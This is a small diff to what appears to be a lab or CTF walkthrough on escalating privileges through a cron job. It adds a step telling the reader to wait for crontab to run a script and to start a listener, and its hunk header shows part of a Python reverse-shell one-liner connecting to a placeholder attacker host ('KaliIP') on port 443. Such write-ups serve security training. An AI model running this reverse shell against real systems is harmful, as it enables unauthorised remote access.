@@ -96,6 +96,9 @@ s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("KaliIP",443));os.
   <img width="940" height="853" alt="image" src="https://github.com/user-attachments/assets/d8a8b84f-ec60-4dd5-836b-489b7c3c9bf5" />
 </p>
 
+Wait for `crontab` to execute the script and set up a listner on our machine :
+
+  <img width="477" height="392" alt="image" src="https://github.com/user-attachments/assets/ea39a311-fa26-4667-a091-c038c0062673" />
 
 
 
